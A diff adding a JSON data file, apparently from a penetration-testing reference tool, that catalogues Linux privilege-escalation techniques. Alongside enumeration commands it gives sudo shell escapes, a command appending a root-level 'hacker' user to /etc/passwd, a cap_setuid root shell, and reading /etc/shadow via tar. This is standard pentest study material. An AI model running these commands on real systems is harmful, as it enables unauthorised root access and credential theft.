@@ -1,0 +1,234 @@
+{
+    "name": "Linux Privilege Escalation",
+    "category": "privesc",
+    "description": "Techniques to escalate privileges on Linux systems",
+    "icon": "🐧",
+    "techniques": [
+        {
+            "id": "linux-privesc-1",
+            "name": "SUID/SGID Binaries",
+            "difficulty": "Beginner",
+            "description": "Find and exploit SUID/SGID binaries for privilege escalation",
+            "steps": [
+                "Find SUID binaries",
+                "Check GTFOBins for exploits",
+                "Execute privilege escalation"
+            ],
+            "commands": [
+                {
+                    "tool": "Find SUID",
+                    "command": "find / -perm -4000 -type f 2>/dev/null",
+                    "description": "Find all SUID binaries"
+                },
+                {
+                    "tool": "Find SGID",
+                    "command": "find / -perm -2000 -type f 2>/dev/null",
+                    "description": "Find all SGID binaries"
+                },
+                {
+                    "tool": "Find Both",
+                    "command": "find / -perm -u=s -o -perm -g=s -type f 2>/dev/null",
+                    "description": "Find SUID and SGID"
+                },
+                {
+                    "tool": "GTFOBins Check",
+                    "command": "# Check https://gtfobins.github.io/ for exploitation",
+                    "description": "Reference for SUID exploits"
+                }
+            ],
+            "tips": [
+                "Common exploitable: nmap, vim, find, bash, more, less",
+                "Check custom binaries carefully"
+            ]
+        },
+        {
+            "id": "linux-privesc-2",
+            "name": "Sudo Misconfiguration",
+            "difficulty": "Beginner",
+            "description": "Exploit sudo permissions for privilege escalation",
+            "steps": [
+                "Check sudo permissions",
+                "Identify exploitable entries",
+                "Escalate to root"
+            ],
+            "commands": [
+                {
+                    "tool": "Check Sudo",
+                    "command": "sudo -l",
+                    "description": "List sudo permissions"
+                },
+                {
+                    "tool": "Sudo Version",
+                    "command": "sudo --version",
+                    "description": "Check for vulnerable sudo version"
+                },
+                {
+                    "tool": "vim Escalation",
+                    "command": "sudo vim -c ':!/bin/bash'",
+                    "description": "Escape to shell from vim"
+                },
+                {
+                    "tool": "find Escalation",
+                    "command": "sudo find /tmp -exec /bin/bash \\;",
+                    "description": "Shell via find"
+                },
+                {
+                    "tool": "python Escalation",
+                    "command": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
+                    "description": "Python shell escape"
+                }
+            ],
+            "tips": [
+                "NOPASSWD entries are gold",
+                "Check for wildcard injections",
+                "Environment variables can help"
+            ]
+        },
+        {
+            "id": "linux-privesc-3",
+            "name": "Kernel Exploits",
+            "difficulty": "Advanced",
+            "description": "Exploit kernel vulnerabilities for root access",
+            "steps": [
+                "Identify kernel version",
+                "Search for exploits",
+                "Compile and execute"
+            ],
+            "commands": [
+                {
+                    "tool": "Kernel Version",
+                    "command": "uname -a",
+                    "description": "Get kernel version"
+                },
+                {
+                    "tool": "OS Release",
+                    "command": "cat /etc/*release*",
+                    "description": "Get OS information"
+                },
+                {
+                    "tool": "Searchsploit",
+                    "command": "searchsploit linux kernel ubuntu",
+                    "description": "Search for kernel exploits"
+                },
+                {
+                    "tool": "linux-exploit-suggester",
+                    "command": "./linux-exploit-suggester.sh",
+                    "description": "Automated exploit suggester"
+                }
+            ],
+            "tips": [
+                "DirtyCow (CVE-2016-5195) affects many older systems",
+                "Compile on similar system if needed",
+                "Kernel exploits may crash system"
+            ]
+        },
+        {
+            "id": "linux-privesc-4",
+            "name": "Cron Jobs",
+            "difficulty": "Intermediate",
+            "description": "Exploit misconfigured cron jobs for escalation",
+            "steps": [
+                "Find cron jobs",
+                "Identify writable scripts",
+                "Inject malicious code"
+            ],
+            "commands": [
+                {
+                    "tool": "System Crons",
+                    "command": "cat /etc/crontab",
+                    "description": "View system crontab"
+                },
+                {
+                    "tool": "Cron Directories",
+                    "command": "ls -la /etc/cron.*",
+                    "description": "List cron directories"
+                },
+                {
+                    "tool": "User Crons",
+                    "command": "crontab -l",
+                    "description": "List user crontab"
+                },
+                {
+                    "tool": "pspy",
+                    "command": "./pspy64",
+                    "description": "Monitor processes without root"
+                }
+            ],
+            "tips": [
+                "Look for scripts running as root",
+                "Check PATH hijacking opportunities",
+                "Wildcard injection in tar/rsync"
+            ]
+        },
+        {
+            "id": "linux-privesc-5",
+            "name": "Writable /etc/passwd",
+            "difficulty": "Intermediate",
+            "description": "Add root user if /etc/passwd is writable",
+            "steps": [
+                "Check file permissions",
+                "Generate password hash",
+                "Add new root user"
+            ],
+            "commands": [
+                {
+                    "tool": "Check Permissions",
+                    "command": "ls -la /etc/passwd",
+                    "description": "Check if writable"
+                },
+                {
+                    "tool": "Generate Hash",
+                    "command": "openssl passwd -1 -salt xyz password123",
+                    "description": "Create password hash"
+                },
+                {
+                    "tool": "Add User",
+                    "command": "echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd",
+                    "description": "Append new root user"
+                },
+                {
+                    "tool": "Switch User",
+                    "command": "su hacker",
+                    "description": "Login as new root user"
+                }
+            ],
+            "tips": [
+                "Also check /etc/shadow permissions",
+                "UID 0 = root privileges"
+            ]
+        },
+        {
+            "id": "linux-privesc-6",
+            "name": "Capabilities",
+            "difficulty": "Advanced",
+            "description": "Exploit Linux capabilities for privilege escalation",
+            "steps": [
+                "Find binaries with capabilities",
+                "Identify exploitable capabilities",
+                "Execute escalation"
+            ],
+            "commands": [
+                {
+                    "tool": "Find Capabilities",
+                    "command": "getcap -r / 2>/dev/null",
+                    "description": "Find all capabilities"
+                },
+                {
+                    "tool": "Python cap_setuid",
+                    "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+                    "description": "Python with cap_setuid"
+                },
+                {
+                    "tool": "Tar cap_dac_read",
+                    "command": "tar -cvf shadow.tar /etc/shadow",
+                    "description": "Read protected files"
+                }
+            ],
+            "tips": [
+                "cap_setuid allows setting UID to 0",
+                "cap_dac_read_search bypasses file permissions",
+                "Check GTFOBins for capabilities"
+            ]
+        }
+    ]
+}
